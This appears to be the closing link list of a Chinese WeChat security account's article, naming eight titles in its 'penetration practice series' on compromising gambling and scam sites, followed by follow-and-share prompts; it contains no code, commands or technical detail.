▶[【渗透实战系列】|8 - 记一次渗透测试从 XSS 到 Getshell 过程（详细到无语）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486005&idx=3&sn=55aad92a300e5a6410aa194b521e11b2&chksm=ce67a0acf91029ba5cd51fbe7c5682fd3eab8a257cf1f6bae44fdaa871bbac7edd51440e4cf8&scene=21#wechat_redirect)

▶[【渗透实战系列】|7 - 记一次理财杀猪盘渗透测试案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485901&idx=1&sn=84b5dac005c838c1b6d22fc4207c81c1&chksm=ce67a354f9102a42260468d305734ed7ea437715ee508f2b3eeb8afa0727b7f4ae652909ff44&scene=21#wechat_redirect)

▶[【渗透实战系列】|6- BC 杀猪盘渗透一条龙 (文末附【渗透实战系列】其他文章链接)](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485861&idx=1&sn=39318b76da490ed2a8746134f685d454&chksm=ce67a33cf9102a2aa3793cafbd701c77f851ca9dac3f827524b5cfe093cbecb14892ee131400&scene=21#wechat_redirect)

▶[【渗透实战系列】|5 - 记一次内衣网站渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485826&idx=2&sn=8f11b7cc12f6c5dfb5eeeb316f14f460&chksm=ce67a31bf9102a0d704877584dc3c49141a376cc1b35c0659f3ae72baa7e77e6de7e0f916db5&scene=21#wechat_redirect)

▶[【渗透实战系列】|4 - 看我如何拿下 BC 站的服务器](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485789&idx=2&sn=a1a3c9fc97eeab0b5e5bd3d311e3fae6&chksm=ce67a3c4f9102ad21ce5c895d364b4d094391d2369edfc3afce63ed0b155f8db1c86fa6924f1&scene=21#wechat_redirect)  

▶[【渗透实战系列】|3 - 一次简单的渗透](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485778&idx=2&sn=997ecdc137f7ae88737e827b29db4e45&chksm=ce67a3cbf9102add52833faf5ad7346affc93589fc8babf72468997c2dbd88c25e8f06d8a7e0&scene=21#wechat_redirect)

▶[【渗透实战系列】|2 - 记一次后门爆破到提权实战案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485647&idx=2&sn=28a227ff21a6a99e323f6e27130a5ad5&chksm=ce67a256f9102b4030db2fc636ff1d454d46178fc2003368305cdc06ae2a4c81dd011dfcb361&scene=21#wechat_redirect)

▶[【渗透实战系列】|1 一次对跨境赌博类 APP 的渗透实战（getshell 并获得全部数据）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485589&idx=1&sn=f4f64ea923675c425f1de9e4e287fb07&chksm=ce67a20cf9102b1a1a171041745bd7c243156eaee575b444acc62d325e2cd2d9f72b2779cf01&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONSgp1TKd5oeaGb76g5eMFibnANHNp30ic7NtpVnU12TNkBynw2ju7RDHbYtVZibm5rjDh7VKbAEyO8ZQ/640?wx_fmt=jpeg)  

**长按 - 识别 - 关注**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONRHbDcqVCY8LR0Y5uDpRzUdh4kN8gRTPLYhNib2rHTJFT9cJ77DRe7tbyjP3mfuRk0P8PKPqdWUbkw/640?wx_fmt=jpeg)

**Hacking 黑白红**

一个专注信息安全技术的学习平台

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBDEU5hJAFfap4mBBAnI4BIic2GAuYgDwUzqwIb9wicGiaCyopAyJEKapgA/640?wx_fmt=gif)

**点分享**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBRJ4tRlk9QKMxMAMticVia5ia8bcewCtM3W67zSrFPyjHuSKmeESESE1Ig/640?wx_fmt=gif)

**点收藏**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBnTO2pb7hEqNd7bAykePEibP0Xw7mJTJ7JnFkHuQR9vHE7tNJyHIibodA/640?wx_fmt=gif)

**点点赞**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBhibuWXia5pNqBfUReATI6GO6sYibzMvj8ibQM6rOo2ULshCrbaM0mJYEqw/640?wx_fmt=gif)

**点在看**